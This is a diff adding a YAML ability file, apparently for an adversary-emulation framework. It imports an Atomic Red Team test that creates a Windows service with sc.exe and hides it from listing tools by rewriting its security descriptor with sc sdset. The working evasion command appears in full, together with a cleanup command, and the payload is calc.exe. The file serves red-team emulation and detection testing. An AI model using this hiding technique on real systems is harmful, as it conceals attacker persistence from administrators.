@@ -1,0 +1,47 @@
+- id: 333c7de0-6fbe-42aa-ac2b-c7e40b18246a
+  name: Create and Hide a Service with sc.exe
+  description: 'The following technique utilizes sc.exe and sdset to change the security
+    descriptor of a service and "hide" it from Get-Service or sc query.
+
+
+    Upon successful execution, sc.exe creates a new service changes the security descriptor.
+
+
+    https://twitter.com/Alh4zr3d/status/1580925761996828672
+
+    https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format'
+  tactic: defense-evasion
+  technique:
+    attack_id: T1564
+    name: Hide Artifacts
+  platforms:
+    windows:
+      sh:
+        command: sc.exe create AtomicService binPath= "C:\Windows\System32\calc.exe";
+          sc sdset AtomicService "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
+        cleanup: 'sc sdset #{service_name} "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)";
+          sc.exe delete #{service_name}'
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - t1564
+  - atomic-red-team
+  - defense-evasion
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      service_name:
+        description: Name of service to create
+        type: string
+        default: AtomicService
+      executable_command:
+        description: Command to execute as a service
+        type: string
+        default: C:\Windows\System32\calc.exe
+    technique_created: '2020-02-26T17:41:25.933Z'
+    atomic_guid: 333c7de0-6fbe-42aa-ac2b-c7e40b18246a
+    import_timestamp: '2025-06-24T11:14:59.975602Z'
